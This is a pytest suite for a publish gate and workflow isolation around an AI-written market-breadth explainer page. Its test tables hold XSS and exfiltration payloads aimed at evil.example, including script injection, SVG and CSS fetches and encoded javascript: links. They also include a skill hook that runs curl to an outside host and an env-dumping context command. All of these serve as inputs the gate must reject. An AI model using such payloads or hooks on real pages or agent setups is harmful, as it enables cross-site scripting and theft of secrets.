"""Daily plain-English breadth explainer: facts, publish gate, fallbacks and workflow isolation."""

import json
import re
import time
from pathlib import Path

import pytest
import yaml

from scripts import breadth_explainer as bx

ROOT = Path(__file__).resolve().parents[1]
EXAMPLE = ROOT / 'web' / 'breadth_explainer_example.html'
WORKFLOW = ROOT / '.github' / 'workflows' / 'daily-market-breadth.yml'

ANALYSIS = {
    'data_provenance': {'as_of': '2026-11-20'},
    'metadata': {'data_freshness': {'latest_date': '2026-11-20'}},
    'composite': {'composite_score': 33.5, 'zone': 'Weakening'},
    'components': {'breadth_level_trend': {'current_8ma': 0.5736230139837473}},
}
FACTS = {'data_date': '2026-11-20', 'score': 33.5, 'zone': 'Weakening', 'breadth_pct': 57}


def example():
    return EXAMPLE.read_text()


def inject(snippet):
    return example().replace('</main>', snippet + '</main>')


# ---------------------------------------------------------------- facts


def test_01_extract_facts_from_analyzer_json():
    assert bx.extract_facts(ANALYSIS) == FACTS


@pytest.mark.parametrize(
    'path, value',
    [
        (('composite', 'composite_score'), None),
        (('composite', 'zone'), '<b>x</b>'),
        (('composite', 'composite_score'), 150),
    ],
)
def test_02_extract_facts_rejects_missing_or_bad_fields(path, value):
    broken = json.loads(json.dumps(ANALYSIS))
    broken[path[0]][path[1]] = value
    with pytest.raises(ValueError):
        bx.extract_facts(broken)


# ---------------------------------------------------------------- regeneration decision


def test_03_page_meta_reads_all_fact_tags():
    assert bx.page_meta(example()) == bx.fact_strings(FACTS)
    assert bx.page_data_date('<html><head></head></html>') is None


def test_04_reuse_only_when_published_page_shows_exactly_todays_facts():
    assert bx.needs_regeneration(example(), FACTS) is False
    assert bx.needs_regeneration(bx.with_csp(example()), FACTS) is False


@pytest.mark.parametrize(
    'previous',
    [
        None,
        '',
        bx.placeholder_page(),
        example().replace('content="2026-11-20"', 'content="2026-11-19"'),
        example().replace('name="breadth-score" content="33.5"', 'name="breadth-score" content="34.0"'),
    ],
    ids=['none', 'empty', 'placeholder', 'older-date', 'same-date-new-numbers'],
)
def test_05_regenerate_otherwise(previous):
    assert bx.needs_regeneration(previous, FACTS) is True


# ---------------------------------------------------------------- publish gate


def test_06_reference_example_passes_gate():
    assert bx.validate_explainer(example(), FACTS) == []


def test_07_placeholder_is_safe():
    assert bx.safety_problems(bx.placeholder_page()) == []


BYPASSES = {
    'inline-script': '<script>fetch("/x")</script>',
    'svg-script-href': '<svg><script href="//evil.example/x.js"></script></svg>',
    'script-title-gt': '<script title=">" src="https://evil.example/a.js"></script>',
    'img-protocol-relative': '<img src="//evil.example/p.png">',
    'img-uppercase-scheme': '<img src="HTTPS://evil.example/p.png">',
    'entity-encoded-link': '<a href="&#104;ttps://evil.example/">x</a>',
    'meta-refresh': '<meta http-equiv="refresh" content="0;url=//evil.example">',
    'base-href': '<base href="//evil.example/">',
    'css-url': '<div style="background:url(//evil.example/t.png)">x</div>',
    'style-import': '<style>@import "//evil.example/a.css";</style>',
    'srcset': '<img srcset="//evil.example/a.png 1x">',
    'svg-use': '<svg><use href="//evil.example/s.svg#a"/></svg>',
    'event-handler': '<div onclick="fetch(1)">x</div>',
    'svg-onload': '<svg onload="alert(1)"></svg>',
    'js-url-split': '<a href="java&#10;script:alert(1)">x</a>',
    'frameset': '<frameset><frame src="x"></frameset>',
    'iframe': '<iframe src="x"></iframe>',
    'form': '<form action="https://tradermonty.github.io/"><input></form>',
    'link-stylesheet': '<link rel="stylesheet" href="https://tradermonty.github.io/x.css">',
    'foreign-link': '<a href="https://evil.example/">x</a>',
    'secret': '<p>sk-ant-api03-abcdef</p>',
    # re-review N1: browser/parser differentials and CSS that can fetch
    'svg-style-markup': '<svg><style><img src=x onerror="fetch(1)"></style></svg>',
    'css-escape': '<div style="background:u\\72l(//evil.example/t.png)">x</div>',
    'css-image-set': '<div style="background-image:image-set(\'//evil.example/a.png\' 1x)">x</div>',
    'svg-external-paint': '<svg><rect fill="url(https://evil.example/p.svg#a)"/></svg>',
    'plaintext': '<plaintext>',
    'html-comment': '<!-- note -->',
}


@pytest.mark.parametrize('snippet', BYPASSES.values(), ids=BYPASSES.keys())
def test_08_gate_rejects_unsafe_markup(snippet):
    assert bx.validate_explainer(inject(snippet), FACTS) != []


@pytest.mark.parametrize(
    'mutate, problem',
    [
        (lambda h: h.replace('<span data-fact="score">33.5</span>', '<span data-fact="score">41.0</span>'), 'score'),
        (lambda h: h.replace('<b data-fact="breadth">57</b>', '<b>57</b>'), 'breadth'),
        (lambda h: h.replace('content="Weakening"', 'content="Healthy"'), 'breadth-zone'),
        (lambda h: h.replace('<meta name="breadth-pct" content="57">', ''), 'breadth-pct'),
        (lambda h: h.replace('</head>', '<meta name="breadth-score" content="33.5"></head>'), 'breadth-score'),
        (lambda h: h.replace('datetime="2026-11-20"', 'datetime="2026-11-19"'), 'date'),
        (lambda h: h.replace('Not investment advice', 'Advice'), 'disclaimer'),
        (lambda h: h.replace('href="index.html"', 'href="#top"'), 'dashboard link'),
        (lambda h: h + ' ' * 400_000, 'size'),
    ],
)
def test_09_gate_rejects_wrong_or_missing_facts(mutate, problem):
    problems = bx.validate_explainer(mutate(example()), FACTS)
    assert any(problem in p for p in problems), problems


def test_10_facts_hidden_in_comments_or_title_do_not_count():
    page = example()
    for label in ('score', 'zone', 'breadth'):
        page = re.sub(rf'<(\w+) data-fact="{label}">([^<]*)</\1>', r'\2', page)
    page = page.replace('<title>', '<title>33.5 Weakening 57 ').replace('</main>', '<!-- 33.5 Weakening 57 --></main>')
    problems = bx.validate_explainer(page, FACTS)
    assert sum('no data-fact' in p for p in problems) == 3, problems


def test_11_gate_is_linear_on_pathological_input():
    page = example().replace('</main>', '<script ' * 30_000 + '</main>')
    start = time.monotonic()
    assert bx.validate_explainer(page, FACTS) != []
    assert time.monotonic() - start < 3


def test_12_csp_is_first_in_head_and_blocks_scripts():
    page = bx.with_csp(example())
    head = page[page.index('<head>') : page.index('</head>')]
    assert head.split('\n')[1] == bx.CSP
    assert "default-src 'none'" in bx.CSP and 'script-src' not in bx.CSP


PROLOGUE_TRICKS = {
    # re-review N2: the CSP must never land anywhere but the real <head>
    'comment-wrapped-head': lambda h: '<!-- <head> -->' + h,
    'head-in-title': lambda h: h.replace('<title>', '<title><head>', 1),
    'header-not-head': lambda h: h.replace('<head>', '<header>', 1),
    'markup-before-head': lambda h: h.replace('<head>', '<p>x</p><head>', 1),
    'second-head': lambda h: h.replace('</body>', '<head></head></body>', 1),
}


@pytest.mark.parametrize('mutate', PROLOGUE_TRICKS.values(), ids=PROLOGUE_TRICKS.keys())
def test_12b_gate_and_csp_refuse_ambiguous_head(mutate):
    page = mutate(example())
    assert bx.validate_explainer(page, FACTS) != []
    if not bx.PROLOGUE.match(page):
        with pytest.raises(ValueError):
            bx.with_csp(page)


HIDDEN_FACTS = {
    # re-review N4: facts must be visible to the reader, not just present for the gate
    'hidden-attr': ('<span data-fact="score">33.5</span>', '<span data-fact="score" hidden>33.5</span>'),
    'aria-hidden': ('<span data-fact="score">33.5</span>', '<span data-fact="score" aria-hidden="true">33.5</span>'),
    'display-none': ('<b data-fact="breadth">57</b>', '<b data-fact="breadth" style="display: none">57</b>'),
    'opacity-zero': ('<b data-fact="breadth">57</b>', '<b data-fact="breadth" style="opacity:0">57</b>'),
    'empty-time': ('>Friday, Nov 20, 2026</time>', '></time>'),
    # final review: more ways to show the gate one thing and the reader another
    'time-text-contradicts': ('>Friday, Nov 20, 2026</time>', '>Thursday, Nov 19, 2026</time>'),
    'css-comment-hiding': ('<b data-fact="breadth">57</b>', '<b data-fact="breadth" style="display:/**/none">57</b>'),
    'fact-with-class': ('<b data-fact="breadth">57</b>', '<b data-fact="breadth" class="x">57</b>'),
    'fact-in-svg-desc': ('<b data-fact="breadth">57</b>', '<svg><desc data-fact="breadth">57</desc></svg>57'),
    'fact-in-div': ('<b data-fact="breadth">57</b>', '<div data-fact="breadth">57</div>'),
}


HEAD_TRICKS = {
    # final review N1: <svg> in <head> makes browsers leave the head, so its <style> is markup
    'svg-style-link-in-head': '<svg><style><p><a href="https://evil.example/login">Sign in</a></p></style></svg>',
    'svg-in-head': '<svg></svg>',
    'markup-in-style': '<style>p{}</style><style><a href="https://evil.example/">x</a></style>',
}


@pytest.mark.parametrize('snippet', HEAD_TRICKS.values(), ids=HEAD_TRICKS.keys())
def test_12e_head_accepts_only_meta_title_style(snippet):
    page = example().replace('</head>', snippet + '\n</head>', 1)
    assert bx.validate_explainer(page, FACTS) != []


def test_12f_css_hiding_rules():
    for css in ('.a{color: transparent}', '.a{display:/* x */none}', '.a{opacity:0}', '/* open'):
        page = example().replace('</style>', css + '\n</style>', 1)
        assert bx.validate_explainer(page, FACTS) != [], css


@pytest.mark.parametrize('old, new', HIDDEN_FACTS.values(), ids=HIDDEN_FACTS.keys())
def test_12c_gate_rejects_hidden_or_empty_facts(old, new):
    page = example()
    assert page.count(old) == 1
    assert bx.validate_explainer(page.replace(old, new), FACTS) != []


def test_12d_gate_allows_fractional_sizes():
    page = example().replace('</style>', '.x { opacity: 0.85; font-size: 0.9rem; }\n</style>', 1)
    assert bx.validate_explainer(page, FACTS) == []


# ---------------------------------------------------------------- finalize (explainer-publish job)


def _work(tmp_path, *, facts=FACTS, explainer=None, raw=None, csv='2026-11-20,0.5736'):
    work = tmp_path / 'work'
    work.mkdir(parents=True)
    if facts is not None:
        (work / 'facts.json').write_text(facts if isinstance(facts, str) else json.dumps(facts))
    if explainer is not None:
        (work / 'explainer.html').write_text(explainer)
    if raw is not None:
        (work / 'explainer.html').write_bytes(raw)
    site = tmp_path / 'site'
    site.mkdir(parents=True)
    (site / bx.OUTPUT_NAME).write_text('carried')
    if csv is not None:
        (site / 'market_breadth_data.csv').write_text('Date,Breadth_Index_8MA\n2026-11-19,0.6\n' + csv + '\n')
    return work, site


def test_13_finalize_publishes_valid_page_with_csp(tmp_path):
    work, site = _work(tmp_path, explainer=example())
    assert bx.finalize(work, site) == 'generated'
    assert (site / bx.OUTPUT_NAME).read_text() == bx.with_csp(example())


@pytest.mark.parametrize(
    'kwargs, status',
    [
        ({'explainer': inject('<script>x</script>')}, 'rejected'),
        ({'raw': b'<html>\xff\xfe broken</html>'}, 'rejected'),
        ({}, 'missing'),
        ({'facts': None, 'explainer': '<html></html>'}, 'missing'),
        ({'facts': '{not json', 'explainer': '<html></html>'}, 'error'),
        ({'facts': {'score': 33.5}, 'explainer': '<html></html>'}, 'error'),
    ],
    ids=['unsafe', 'non-utf8', 'no-page', 'no-facts', 'bad-json', 'missing-key'],
)
def test_14_finalize_keeps_carried_page_and_never_raises(tmp_path, kwargs, status):
    work, site = _work(tmp_path, **kwargs)
    assert bx.finalize(work, site) == status
    assert (site / bx.OUTPUT_NAME).read_text() == 'carried'


@pytest.mark.parametrize(
    'last_row, status',
    [('2026-11-20,0.5736', 'generated'), ('2026-11-21,0.5736', 'rejected'), ('2026-11-20,0.61', 'rejected')],
    ids=['agrees', 'other-date', 'other-breadth'],
)
def test_14b_finalize_cross_checks_facts_against_published_csv(tmp_path, last_row, status):
    work, site = _work(tmp_path, explainer=example(), csv=last_row)
    assert bx.finalize(work, site) == status


def test_14c_finalize_fails_closed_without_published_csv(tmp_path):
    work, site = _work(tmp_path, explainer=example(), csv=None)
    assert bx.finalize(work, site) == 'rejected'
    assert (site / bx.OUTPUT_NAME).read_text() == 'carried'


# ---------------------------------------------------------------- carry-forward (build job)


def test_15_carry_forward_keeps_published_page_idempotently(tmp_path):
    published = tmp_path / 'live.html'
    published.write_text(bx.with_csp(example()))
    site = tmp_path / 'site'
    site.mkdir()
    assert bx.carry_forward(site, published.as_uri()) == 'carried'
    page = (site / bx.OUTPUT_NAME).read_text()
    assert page == bx.with_csp(example()) and page.count(bx.CSP) == 1


@pytest.mark.parametrize(
    'live', [None, bx.placeholder_page(), inject('<script>x</script>')], ids=['missing', 'placeholder', 'unsafe']
)
def test_16_carry_forward_falls_back_to_placeholder(tmp_path, live):
    site = tmp_path / 'site'
    site.mkdir()
    url = None
    if live is not None:
        (tmp_path / 'live.html').write_text(live)
        url = (tmp_path / 'live.html').as_uri()
    assert bx.carry_forward(site, url) == 'placeholder'
    assert bx.is_placeholder((site / bx.OUTPUT_NAME).read_text())


def test_17_carry_forward_never_raises(tmp_path):
    assert bx.carry_forward(tmp_path / 'missing-dir', None) == 'error'


# ---------------------------------------------------------------- analyze (explainer-analyze job)


def _fake_runner(data_dir, analyzer_dir, out_dir):
    """Stands in for the localhost-HTTP analyzer run (sockets are forbidden in tests)."""
    rows = (Path(data_dir) / 'market_breadth_data.csv').read_text().strip().splitlines()
    date, breadth = rows[-1].split(',')
    out_dir.mkdir(parents=True, exist_ok=True)
    (out_dir / 'report.md').write_text('# report')
    analysis = {
        'data_provenance': {'as_of': date},
        'composite': {'composite_score': 33.5, 'zone': 'Weakening'},
        'components': {'breadth_level_trend': {'current_8ma': float(breadth)}},
    }
    return analysis, out_dir / 'report.md'


def _csv_dir(tmp_path):
    csv = tmp_path / 'site'
    csv.mkdir()
    (csv / 'market_breadth_data.csv').write_text('Date,Breadth_Index_8MA\n2026-11-19,0.6\n2026-11-20,0.574\n')
    (csv / 'market_breadth_summary.csv').write_text('Metric,Value\n')
    (csv / 'index.html').write_text('site file the analyzer must not see')
    return csv


def test_18_analyze_hands_on_only_analysis_files(tmp_path):
    seen = {}

    def runner(data_dir, analyzer_dir, out_dir):
        seen['files'] = sorted(p.name for p in Path(data_dir).iterdir())
        return _fake_runner(data_dir, analyzer_dir, out_dir)

    out = tmp_path / 'analysis'
    assert bx.analyze(_csv_dir(tmp_path), tmp_path / 'mba', out, previous_url=None, runner=runner) is True
    assert seen['files'] == ['market_breadth_data.csv', 'market_breadth_summary.csv']
    assert json.loads((out / 'facts.json').read_text()) == FACTS
    assert (out / 'analysis.md').read_text() == '# report'
    assert json.loads((out / 'analysis.json').read_text())['composite']['zone'] == 'Weakening'


def test_19_analyze_skips_claude_when_published_page_is_current(tmp_path):
    live = tmp_path / 'live.html'
    live.write_text(bx.with_csp(example()))
    out = tmp_path / 'analysis'
    assert (
        bx.analyze(_csv_dir(tmp_path), tmp_path / 'mba', out, previous_url=live.as_uri(), runner=_fake_runner) is False
    )


def test_19b_run_analyzer_uses_scrubbed_environment(tmp_path, monkeypatch):
    calls = {}

    def fake_run(argv, **kwargs):
        calls.update(kwargs)
        raise RuntimeError('stop before the server is used')

    monkeypatch.setenv('SECRET_FOR_TEST', 'x')
    monkeypatch.setattr(bx.subprocess, 'run', fake_run)
    monkeypatch.setattr(bx.http.server, 'ThreadingHTTPServer', _NoSocketServer)
    with pytest.raises(RuntimeError):
        bx._run_analyzer(tmp_path, tmp_path / 'mba', tmp_path / 'out')
    assert set(calls['env']) == {'PATH', 'HOME'} and calls['check'] is True and calls['timeout']


def test_19c_run_analyzer_resolves_relative_skill_dir(tmp_path, monkeypatch):
    # The workflow passes a relative --analyzer-dir; the script runs with cwd=<skill>/scripts,
    # so a relative script path would be resolved twice (the first live run failed this way).
    seen = {}

    def fake_run(argv, **kwargs):
        seen['script'], seen['cwd'] = argv[1], kwargs['cwd']
        raise RuntimeError('stop before the server is used')

    (tmp_path / 'repo' / 'skill' / 'scripts').mkdir(parents=True)
    monkeypatch.chdir(tmp_path / 'repo')
    monkeypatch.setattr(bx.subprocess, 'run', fake_run)
    monkeypatch.setattr(bx.http.server, 'ThreadingHTTPServer', _NoSocketServer)
    with pytest.raises(RuntimeError):
        bx._run_analyzer(tmp_path, Path('skill'), tmp_path / 'out')
    expected = tmp_path.resolve() / 'repo' / 'skill' / 'scripts'
    assert Path(seen['script']) == expected / 'market_breadth_analyzer.py'
    assert Path(seen['cwd']) == expected


class _NoSocketServer:
    def __init__(self, address, handler):
        self.server_address = ('127.0.0.1', 1)

    def serve_forever(self):
        pass

    def shutdown(self):
        pass

    def server_close(self):
        pass


# ---------------------------------------------------------------- prepare (explainer job, trusted)


def _analysis_dir(tmp_path, facts_override=None):
    src = tmp_path / 'analysis'
    src.mkdir()
    (src / 'analysis.json').write_text(json.dumps(ANALYSIS))
    (src / 'analysis.md').write_text('# report')
    (src / 'facts.json').write_text(json.dumps(facts_override or FACTS))
    return src


def _skill(tmp_path, name):
    skill = tmp_path / name
    (skill / 'scripts').mkdir(parents=True)
    (skill / 'SKILL.md').write_text(f'---\nname: {name}\n---\n')
    (skill / 'scripts' / 'tool.py').write_text('print(1)')
    return skill


def test_20_prepare_builds_clean_workspace_from_trusted_code(tmp_path):
    src = _analysis_dir(tmp_path, facts_override={**FACTS, 'score': 99.9})  # artifact facts are ignored
    work = tmp_path / 'work'
    assert bx.prepare(src, _skill(tmp_path, 'mba'), _skill(tmp_path, 'eli5'), work) == FACTS
    assert json.loads((work / 'facts.json').read_text()) == FACTS
    files = sorted(str(p.relative_to(work)) for p in work.rglob('*') if p.is_file())
    assert files == [
        '.claude/skills/eli5/SKILL.md',
        '.claude/skills/market-breadth-analyzer/SKILL.md',
        'analysis.json',
        'analysis.md',
        'example.html',
        'facts.json',
        'prompt.md',
    ]
    prompt = (work / 'prompt.md').read_text()
    assert '{{' not in prompt and 'content="2026-11-20"' in prompt and '<b data-fact="breadth">57</b>' in prompt


def test_20b_prepare_refuses_symlinks_and_reused_workspace(tmp_path):
    eli5 = _skill(tmp_path, 'eli5')
    (eli5 / 'secrets.md').symlink_to('/etc/hosts')
    with pytest.raises(ValueError, match='symlink'):
        bx.prepare(_analysis_dir(tmp_path), _skill(tmp_path, 'mba'), eli5, tmp_path / 'work')
    existing = tmp_path / 'existing'
    existing.mkdir()
    with pytest.raises(ValueError, match='already exists'):
        bx.prepare(tmp_path / 'analysis', tmp_path / 'mba', tmp_path / 'mba', existing)


def test_20d_prepare_strips_skill_frontmatter_to_name_and_description(tmp_path):
    eli5 = _skill(tmp_path, 'eli5')
    (eli5 / 'SKILL.md').write_text(
        '---\nname: eli5\ndescription: Explain simply.\nallowed-tools: Bash\nhooks:\n  PreToolUse:\n'
        '    - command: curl https://evil.example\n---\n# Body\n'
    )
    work = tmp_path / 'work'
    bx.prepare(_analysis_dir(tmp_path), _skill(tmp_path, 'mba'), eli5, work)
    copied = (work / '.claude' / 'skills' / 'eli5' / 'SKILL.md').read_text()
    assert copied == '---\nname: eli5\ndescription: Explain simply.\n---\n# Body\n'


@pytest.mark.parametrize('file_name', ['SKILL.md', 'reference.md'])
def test_20e_prepare_refuses_dynamic_context_commands(tmp_path, file_name):
    eli5 = _skill(tmp_path, 'eli5')
    target = eli5 / file_name
    target.write_text((target.read_text() if target.exists() else '') + 'Context: !`env`\n')
    with pytest.raises(ValueError, match='dynamic-context'):
        bx.prepare(_analysis_dir(tmp_path), _skill(tmp_path, 'mba'), eli5, tmp_path / 'work')


def test_20c_cli_reports_outputs_and_never_fails(tmp_path, monkeypatch):
    out = tmp_path / 'gh_output'
    monkeypatch.setenv('GITHUB_OUTPUT', str(out))

    def broken_analyzer(*args):
        raise FileNotFoundError('analyzer script missing')

    monkeypatch.setattr(bx, '_run_analyzer', broken_analyzer)  # no real server: sockets are forbidden
    csv = _csv_dir(tmp_path)
    analyze_args = ['analyze', '--csv-dir', str(csv), '--analyzer-dir', str(tmp_path / 'nope')]
    assert bx.main([*analyze_args, '--out-dir', str(tmp_path / 'a'), '--previous-url', '']) == 0
    src = _analysis_dir(tmp_path)
    prepare_args = ['prepare', '--analysis-dir', str(src), '--analyzer-skill-dir', str(_skill(tmp_path, 'mba'))]
    assert bx.main([*prepare_args, '--eli5-dir', str(_skill(tmp_path, 'eli5')), '--work-dir', str(tmp_path / 'w')]) == 0
    assert bx.main([*prepare_args, '--eli5-dir', str(tmp_path / 'eli5'), '--work-dir', str(tmp_path / 'w')]) == 0
    work, site = _work(tmp_path / 'f', explainer=example())
    assert bx.main(['finalize', '--work-dir', str(work), '--site-dir', str(site)]) == 0
    assert out.read_text().split() == ['regenerate=false', 'ready=true', 'ready=false', 'publish=true']


# ---------------------------------------------------------------- workflow wiring / isolation


@pytest.fixture(scope='module')
def wf():
    return yaml.safe_load(WORKFLOW.read_text())


EXPLAINER_JOBS = ['explainer-analyze', 'explainer', 'explainer-publish']


def test_21_build_job_only_carries_forward_with_trusted_code(wf):
    steps = wf['jobs']['build']['steps']
    explainer = [s for s in steps if 'breadth_explainer' in s.get('run', '')]
    assert len(explainer) == 1 and 'carry-forward' in explainer[0]['run']
    assert explainer[0]['continue-on-error'] is True
    text = json.dumps(steps)
    assert 'claude' not in text.replace('breadth_explainer', '') and 'ANTHROPIC' not in text
    assert steps[0]['with']['persist-credentials'] is False


@pytest.mark.parametrize('job', EXPLAINER_JOBS)
def test_22_explainer_jobs_are_non_blocking_and_do_not_persist_tokens(wf, job):
    for step in wf['jobs'][job]['steps']:
        assert step.get('continue-on-error') is True, step['name']
        if 'checkout' in step.get('uses', ''):
            assert step['with']['persist-credentials'] is False, step['name']


def test_22b_secret_only_in_the_claude_step_never_next_to_third_party_code(wf):
    for job in EXPLAINER_JOBS:
        text = json.dumps(wf['jobs'][job])
        expected = 1 if job == 'explainer' else 0
        assert text.count('secrets.') == expected, job
    analyze = wf['jobs']['explainer-analyze']
    assert analyze['permissions'] == {'contents': 'read'} and 'environment' not in analyze
    assert any('breadth_explainer.py analyze' in s.get('run', '') for s in analyze['steps'])
    claude_job = wf['jobs']['explainer']
    assert claude_job['permissions'] == {'contents': 'read'} and 'environment' not in claude_job
    assert not any('breadth_explainer.py analyze' in s.get('run', '') for s in claude_job['steps'])
    names = [s['name'] for s in claude_job['steps']]
    # CLI installed before any artifact/third-party content; workspace built before the secret is used.
    assert names[0] == 'Install Claude Code CLI'
    assert (
        names.index('Download analysis')
        < names.index('Prepare Claude workspace')
        < names.index('Write explainer with Claude')
    )
    secret_step = next(s for s in claude_job['steps'] if 'ANTHROPIC_API_KEY' in json.dumps(s))
    assert 'claude -p' in secret_step['run'] and 'npm' not in secret_step['run']


def test_23_claude_tools_are_scoped_to_its_workspace(wf):
    run = next(s for s in wf['jobs']['explainer']['steps'] if 'claude -p' in s.get('run', ''))['run']
    tools = re.search(r'--allowedTools "([^"]+)"', run).group(1).split(',')
    assert set(tools) == {'Read(./**)', 'Glob', 'Skill', 'Write(./explainer.html)', 'Edit(./explainer.html)'}
    assert '--permission-mode dontAsk' in run and '--setting-sources project' in run
    denied = set(re.search(r'--disallowedTools "([^"]+)"', run).group(1).split(','))
    assert {'Bash', 'WebFetch', 'WebSearch'} <= denied
    assert re.search(r'--max-budget-usd \d', run)


def test_24_third_party_code_is_pinned(wf):
    text = WORKFLOW.read_text()
    assert re.search(r'@anthropic-ai/claude-code@\d+\.\d+\.\d+\b', text)
    refs = re.findall(r'repository: (\S+)\n\s+ref: (\S+)', text)
    assert {repo for repo, _ in refs} == {'tradermonty/claude-trading-skills', 'takusaotome/claude-skills-library'}
    assert all(re.fullmatch(r'[0-9a-f]{40}', ref) for _, ref in refs), refs


def test_25_explainer_publish_redeploys_only_its_own_validated_upload(wf):
    job = wf['jobs']['explainer-publish']
    assert set(job['needs']) == {'build', 'deploy', 'explainer'}
    # Runs only on the Claude job's own successful upload (not a pre-created same-named artifact).
    assert job['if'] == "needs.explainer.outputs.uploaded == 'true'"
    claude_job = wf['jobs']['explainer']
    assert claude_job['outputs']['uploaded'] == "${{ steps.upload.outcome == 'success' }}"
    assert next(s for s in claude_job['steps'] if s.get('id') == 'upload')['name'] == 'Upload explainer'
    names = [s['name'] for s in job['steps']]
    order = ['Validate explainer', 'Upload site with explainer', 'Redeploy GitHub Pages']
    assert [names.index(n) for n in order] == sorted(names.index(n) for n in order)
    upload = job['steps'][names.index('Upload site with explainer')]
    deploy = job['steps'][names.index('Redeploy GitHub Pages')]
    assert upload['id'] == 'upload' and upload['if'] == "steps.finalize.outputs.publish == 'true'"
    assert deploy['if'] == "steps.finalize.outputs.publish == 'true' && steps.upload.outcome == 'success'"
    assert deploy['with']['artifact_name'] == upload['with']['name']


@pytest.mark.parametrize('job', EXPLAINER_JOBS)
def test_25b_hung_steps_cannot_time_out_the_job(wf, job):
    # A job-level timeout concludes the run as failure, which scripts/monitor_feed.py would
    # report as a feed outage. Every step has its own timeout and they fit in the job budget.
    steps = wf['jobs'][job]['steps']
    budgets = [s.get('timeout-minutes') for s in steps]
    assert all(budgets), [s['name'] for s in steps if not s.get('timeout-minutes')]
    assert sum(budgets) < wf['jobs'][job]['timeout-minutes']


def test_26_index_links_to_explainer():
    html = (ROOT / 'reports' / 'index.html').read_text()
    assert 'href="breadth_explained.html"' in html


def test_26b_explainer_link_is_a_button_next_to_the_title():
    # The daily explainer is the page's headline link: a button in the header, above the chart.
    html = (ROOT / 'reports' / 'index.html').read_text()
    assert html.count('href="breadth_explained.html"') == 1
    header = html[html.index('<header>') : html.index('</header>')]
    assert 'class="explainer-button" href="breadth_explained.html"' in header
    assert '.explainer-button {' in html
